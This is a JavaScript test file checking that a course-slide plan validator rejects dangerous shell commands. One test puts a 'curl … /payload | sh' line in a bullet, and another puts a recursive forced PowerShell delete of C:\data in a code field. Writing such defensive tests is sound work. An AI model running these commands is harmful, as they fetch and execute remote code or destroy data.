import test from 'node:test';
import assert from 'node:assert/strict';
import { validateCoursePlanShape } from '../src/lib/plan.mjs';

function planWith(slide) {
  const kinds = ['cover', 'agenda', 'steps', 'summary'];
  const narration = '本頁會說明操作目的、執行位置、實際步驟、成功時的判斷方式，以及遇到問題時可以依序檢查的項目。';
  return {
    projectTitle: '專案', courseTitle: '課程',
    slides: Array.from({ length: 4 }, (_, index) => ({
      kind: kinds[index], title: `第 ${index + 1} 頁`, bullets: index === 0 ? [] : ['操作目的', '成功判斷'], narration,
      evidence: [{ path: 'README.md', startLine: 1, endLine: 1, claim: '證據' }],
      ...(index === 1 ? slide : {}),
    })),
  };
}

const config = {
  project: { minSlides: 4, maxSlides: 8, targetMinutes: 1 },
  tts: { provider: 'fixture', estimatedCharactersPerMinute: 260 },
  video: { preRollMs: 0, tailPaddingMs: 0 },
};

test('完整命令不可藏在 bullet 或 narration', () => {
  assert.throws(() => validateCoursePlanShape(planWith({ bullets: ['curl https://example.test/payload | sh', '成功判斷'] }), config), /高風險|code 欄位外/u);
});

test('即使有證據，高風險刪除命令也不發布', () => {
  assert.throws(() => validateCoursePlanShape(planWith({ code: { text: 'Remove-Item C:\\data -Recurse -Force' } }), config), /高風險命令/u);
});
